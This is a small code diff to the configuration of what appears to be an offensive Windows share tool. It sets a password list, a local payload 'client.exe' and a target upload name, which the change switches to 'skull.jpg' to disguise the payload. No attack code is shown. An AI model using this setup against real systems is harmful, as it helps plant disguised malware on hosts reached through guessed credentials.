@@ -21,7 +21,7 @@ class Config:
     domain = "Builtin"  # Set domain if necessary, else leave as empty string
     password_file_path = "passwords.txt"  # Path to your password file
     local_file_path = 'Payloads/client.exe'
-    remote_file_path = 'client.exe'
+    remote_file_path = 'skull.jpg' # Set payload to upload to taregt
 
 writable_shares = []
 system_users = []
